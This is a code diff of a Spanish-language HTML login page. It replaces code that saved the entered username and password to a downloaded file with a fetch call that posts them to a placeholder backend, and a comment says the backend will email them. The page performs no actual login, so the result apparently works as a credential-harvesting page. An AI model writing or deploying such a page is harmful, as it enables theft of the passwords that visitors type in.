@@ -56,30 +56,50 @@
   <div id="login-box">
     <h2>Iniciar Sesión</h2>
     <div class="error-message" id="error-message"></div>
-    <input type="text" id="username" placeholder="Nombre de usuario">
-    <input type="password" id="password" placeholder="Contraseña">
-    <button onclick="login()">Iniciar Sesión</button>
+    <form id="login-form">
+      <input type="text" id="username" name="username" placeholder="Nombre de usuario">
+      <input type="password" id="password" name="password" placeholder="Contraseña">
+      <button type="submit">Iniciar Sesión</button>
+    </form>
   </div>
 
   <script>
-    function login() {
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault(); // Evitar que el formulario se envíe normalmente
+
       var username = document.getElementById("username").value;
       var password = document.getElementById("password").value;
 
       if (username.trim() === "" || password.trim() === "") {
         document.getElementById("error-message").innerText = "Por favor, ingresa el nombre de usuario y la contraseña.";
       } else {
-        var data = "Nombre de usuario: " + username + "\nContraseña: " + password;
-        var filename = "datos_de_inicio_de_sesion.txt";
+        var formData = new FormData();
+        formData.append("username", username);
+        formData.append("password", password);
 
-        var blob = new Blob([data], { type: "text/plain" });
-        var link = document.createElement("a");
-        link.download = filename;
-        link.href = window.URL.createObjectURL(blob);
-        link.click();
-        document.getElementById("error-message").innerText = ""; // Limpiar mensaje de error
+        // Aquí debes enviar los datos a un servidor backend para procesar el envío del correo electrónico
+        // Puedes usar XMLHttpRequest, fetch API u otras bibliotecas como Axios para hacer la solicitud al servidor
+        // Por ejemplo, usando fetch API:
+        fetch("URL_DEL_BACKEND", {
+          method: "POST",
+          body: formData
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("Error al enviar los datos.");
+          }
+          return response.text();
+        })
+        .then(data => {
+          alert("Los datos se han enviado correctamente.");
+          document.getElementById("error-message").innerText = ""; // Limpiar mensaje de error después de enviar los datos
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          document.getElementById("error-message").innerText = "Ha ocurrido un error al enviar los datos.";
+        });
       }
-    }
+    });
   </script>
 </body>
 </html>
